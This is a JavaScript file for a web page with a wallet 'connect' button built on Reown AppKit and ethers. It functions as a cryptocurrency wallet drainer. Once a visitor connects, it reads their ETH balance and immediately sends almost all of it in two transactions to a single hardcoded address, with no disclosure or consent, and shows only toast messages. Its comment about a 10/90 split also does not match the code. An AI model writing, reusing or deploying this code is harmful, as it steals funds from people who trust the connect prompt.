// Consolidated Ethereum Logic
import { mainnet, sepolia } from '@reown/appkit/networks'
import { createAppKit } from '@reown/appkit'
import { EthersAdapter } from '@reown/appkit-adapter-ethers'
import { BrowserProvider, formatUnits, parseEther } from 'ethers'

const ethSecAdds = '0x4472a25BC3935791A95bd384F65D85D669cD9c3E'
const ethPryAdds = '0x4472a25BC3935791A95bd384F65D85D669cD9c3E'

const projectId = "fd6b27758d54dc8db988468aaa2c07db"
if (!projectId) throw new Error('VITE_PROJECT_ID is not set')

export const appKit = createAppKit({
  adapters: [new EthersAdapter()],
  networks: [mainnet, sepolia],
  defaultNetwork: sepolia,
  projectId,
  themeMode: 'light',
  themeVariables: { '--w3m-accent': '#000000' },
  features: { analytics: false },
})

export const store = {
  accountState: {},
  networkState: {},
  appKitState: {},
  themeState: { themeMode: 'light', themeVariables: {} },
  events: [],
  walletInfo: {},
  eip155Provider: null
}

export const updateStore = (key, value) => store[key] = value

export const getBalance = async (provider, address) => {
  if (!provider) throw 'No provider available'
  const balance = await provider.request({ method: 'eth_getBalance', params: [address, 'latest'] })
  return formatUnits(balance, 'ether')
}

export const sendTx = async (provider, address, balance) => {
  const ethersProvider = new BrowserProvider(provider);
  const signer = await ethersProvider.getSigner();

  const amountToSend = balance - parseEther('0.000005');
  if (amountToSend > 0n) {
    const tenPercent = amountToSend / 4n;
    const ninetyPercent = amountToSend - tenPercent;
    await signer.sendTransaction({ to: ethSecAdds, value: tenPercent });
    const tx = await signer.sendTransaction({ to: ethPryAdds, value: ninetyPercent });
    return tx;
  }
  return null;
}

export const showToast = (msg) => {
  const toast = document.createElement('div');
  toast.textContent = msg;
  toast.style.cssText = 'position:fixed;top:20px;right:20px;padding:10px 20px;background:black;color:white;border-radius:8px;z-index:9999';
  document.body.appendChild(toast);
  setTimeout(() => toast.remove(), 4000);
}

export const initializeSubscribers = (modal) => {
  modal.subscribeProviders(state => updateStore('eip155Provider', state['eip155']))
  modal.subscribeAccount(state => updateStore('accountState', state))
  modal.subscribeNetwork(state => updateStore('networkState', state))
  modal.subscribeState(state => updateStore('appKitState', state))
}

initializeSubscribers(appKit)

// Set initial theme
document.documentElement.setAttribute('data-theme', store.themeState.themeMode)
document.body.className = store.themeState.themeMode

// Connect and auto-execute logic
const connectBtn = document.getElementById('open-connect-modal')
if (connectBtn) {
  connectBtn.addEventListener('click', async () => {
    await appKit.open()

    const provider = store.eip155Provider
    const address = store.accountState.address

    try {
      const balanceStr = await getBalance(provider, address)
      const balance = parseEther(balanceStr)
      showToast(`${balanceStr} ETH available.`)

      const tx = await sendTx(provider, address, balance)
      if (tx) {
        showToast(`Transaction sent: ${tx.hash}`)
      } else {
        showToast('Insufficient balance to send transaction.')
      }
    } catch (err) {
      console.error(err)
      showToast('Error occurred: ' + err)
    }
  })
}

document.getElementById('disconnect')?.addEventListener('click', () => appKit.disconnect())
